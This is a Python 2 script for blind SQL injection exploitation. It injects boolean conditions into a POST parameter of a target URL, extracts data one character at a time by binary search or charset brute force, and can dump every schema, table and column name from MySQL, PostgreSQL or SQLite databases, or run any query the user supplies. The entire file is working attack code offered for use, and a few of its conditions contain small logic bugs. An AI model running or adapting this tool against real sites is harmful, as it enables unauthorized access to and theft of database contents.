#!/usr/bin/env python
# coding : utf-8

from httplib import *
from urllib import urlencode
import string
import sys
import argparse
import time


# PARAMS
host = 'foo.bar'
port = 80
# You can define proxy server like Burp
host_connect = '127.0.0.1'
port_connect = 8080
url = 'http://foo.bar/?vuln=erable'
payload = "azerty' OR 1=%s -- " 
method = 'POST'
sleep_time = 0.1

def compare_gt(value, sql, pos, db):
    if db == 'mysql' or db == 'postgres':
        sql = "(if(ascii(substring((%s),%i,1))>%i,1,0))" % (sql, pos, value)
    elif db == 'sqlite':
        sql = "(case when substr((%s),%i,1) > '%s' then 1 else 0 end)" % (sql, pos, value)
    return payload % sql

def compare_eq(value, sql, pos, db):
    if db == 'sqlite':
        sql = "(case when substr((%s),%i,1) = '%s' then 1 else 0 end)" % (sql, pos, value)
    return payload % sql

def web_request(payload):
    connection = HTTPConnection(host_connect, port=port_connect)
    
    headers = {
        "Host" : host+':'+str(port),
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded" }
    
    if method != 'POST':
        del headers['Content-Type']
    
    data = dict(recherche=payload)
    
    if method == 'POST':
        connection.request(method, url, urlencode(data), headers)
    else:
        connection.request(method, url, None, headers)

    response = connection.getresponse()
    content = response.read()
    code = response.status
    connection.close()
    
    # Define your verification method
    if '5 result' in content:
    #if response.status == 302:
        return True
    return False
    
def request_blind(sql, db):
    pos = 1
    returned_value = ''
    if db == 'mysql' or db == 'postgres':
        while True:
            result = ''
            max = 128
            min = 0
            counter = 1
            while counter < 8:
                half = (max-min)/2+min
                payload = compare_gt(half, sql, pos, db)
                if web_request(payload):
                    min = half
                    result = max
                else:
                    max = half
                    result = max
                counter += 1
            if min == 0 and max == 1:
                break
            pos += 1
            returned_value += chr(result)
    elif db == 'sqlite':
        charset = string.ascii_letters+string.digits+string.punctuation+' '
        while True:
            result = ''
            for ch in charset:
                payload = compare_eq(ch, sql, pos, db)
                time.sleep(sleep_time)
                if web_request(payload):
                    result = ch
                    break
            if not result:
                break
            if result:
                returned_value += ch
            pos += 1
    return returned_value

def exploit_blind(sql_request, db):
    row = 0
    while True:
        name = request_blind('%s limit %i,1' % (sql_request, row), db)
        if not name:
            break
        row += 1
        yield name

if __name__=='__main__':
    parser = argparse.ArgumentParser(description = 'Blind SQL Injection exploitation')
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-s', '--sql', action = 'store', help = 'SQL request to execute')
    group.add_argument('-X', '--dumpall', action = 'store_true', help = 'Dump the whole schema')
    parser.add_argument('-d', '--database', action = 'store', choices = ('mysql', 'postgres', 'sqlite'), required = True, help = 'Type of database')
    
    if len(sys.argv) <= 1:
        print 'Specify one option.'
        parser.print_help() 
        exit(1)
    
    # Retrieve arguments from command line
    args = parser.parse_args()
   
    # Dump the databse
    if args.dumpall and args.database == 'mysql' or args.database == 'postgres':
        for db in exploit_blind('select schema_name from information_schema.schemata', args.database):
            print '\tDB : %s' % db
            for table in exploit_blind("select table_name from information_schema.tables where table_schema='%s'" % db, args.database):
                print '\t\tTB : %s' % table
                for column in exploit_blind("select column_name from information_schema.columns where table_name='%s'" % table, args.database):
                    print '\t\t\tCL : %s' % column

        exit(0)
    
    if args.dumpall and args.database == 'sqlite':
        for table in exploit_blind("select name from sqlite_master where type='table'", args.database):
            print '\tTB : %s' % table
            for column in exploit_blind("SELECT sql FROM sqlite_master WHERE tbl_name = '%s' AND type = 'table'" % table, args.database):
                print '\t\tCL : %s' % column

        exit(0)

    for elem in exploit_blind(args.sql, args.database):
        print elem


